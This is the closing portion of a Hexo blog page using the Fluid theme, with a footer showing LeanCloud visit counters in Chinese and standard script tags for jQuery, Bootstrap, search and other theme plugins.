     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- LeanCloud 统计PV -->
        <span id="leancloud-site-pv-container" style="display: none">
            总访问量 
            <span id="leancloud-site-pv"></span>
             次
          </span>
      
      
        <!-- LeanCloud 统计UV -->
        <span id="leancloud-site-uv-container" style="display: none">
            总访客数 
            <span id="leancloud-site-uv"></span>
             人
          </span>
      

    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>




  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      $('#local-search-input').on('click', function() {
        searchFunc(path, 'local-search-input', 'local-search-result');
      });
      $('#modalSearch').on('shown.bs.modal', function() {
        $('#local-search-input').focus();
      });
    })()
  </script>












  

  

  

  

  

  





<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
